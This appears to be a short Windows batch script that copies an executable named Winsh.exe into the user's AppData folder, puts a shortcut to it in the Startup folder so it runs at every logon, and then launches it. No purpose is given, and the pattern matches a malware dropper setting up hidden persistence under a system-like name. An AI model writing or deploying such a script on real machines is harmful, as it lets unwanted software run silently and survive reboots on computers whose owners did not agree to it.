copy Winsh.exe %appdata%
copy Winsh.lnk "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
start "" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Winsh.lnk"